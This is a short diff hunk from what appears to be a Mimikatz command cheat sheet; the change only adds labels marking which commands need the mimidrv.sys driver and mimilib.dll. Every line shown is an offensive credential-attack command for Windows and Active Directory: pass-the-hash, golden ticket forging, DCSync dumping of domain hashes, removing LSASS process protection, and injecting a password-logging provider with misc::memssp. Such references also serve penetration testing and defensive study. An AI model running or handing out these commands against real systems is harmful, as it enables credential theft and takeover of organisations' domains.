@@ -76,9 +76,11 @@ sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlmhash>
 kerberos::golden /user:<user> /domain:<domain> /sid:<sid> /krbtgt:<krbtgt hash> /endin:<value> /renewmax:<value>
 lsadump::dcsync /domain:<domain> /user:<user>
 
+mimidrv.sys:
 !+
 !processprotect /process:lsass.exe /remove
 
+mimilib.dll:
 misc::memssp
 
 ----------------------------------------------------------------------------------------------------------------------------------------
